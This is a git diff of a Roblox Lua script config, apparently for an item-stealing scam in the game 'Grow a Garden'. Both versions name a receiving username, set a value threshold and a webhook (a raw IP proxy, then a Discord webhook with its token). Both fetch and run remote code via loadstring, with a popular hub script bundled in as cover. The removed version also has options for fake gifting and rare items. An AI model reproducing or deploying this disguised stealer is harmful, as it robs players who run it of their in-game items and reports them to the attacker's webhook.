@@ -1,14 +1,9 @@
-_G.NullConfig = {
-    User = {"aiko102050"},
-    min_value = 10000000000,
-    pingEveryone = "No", -- dont change this
-    Webhook = "http://176.100.37.215:20002/proxy/d38071923729f622846297adfb888b32",
-    FakeGift = "No",
-    Trash = "http://176.100.37.215:20002/proxy/67be85414cc56f000fd003d69c528d0a",
-    LoadingScreen = "Yes",
-    GiftOnlyRares = "Yes",
-    ExecuteOtherScript = "Yes",
-    OtherScript = "--[[ 	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk! ]] loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()",
-}
-    
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
+Username = "aiko102050"
+Webhook = "https://discord.com/api/webhooks/1402695253483458753/OaXDtIQ4P5bZnesq5dLNFXlFZ2E2z4TuvSsvcEUPxOhtFTY9mqmtaUk6gEp19q7t6FnV"
+MinimumValue = 1
+
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/invcts923/Speed-Hub/refs/heads/main/Speed%20Hub"))()
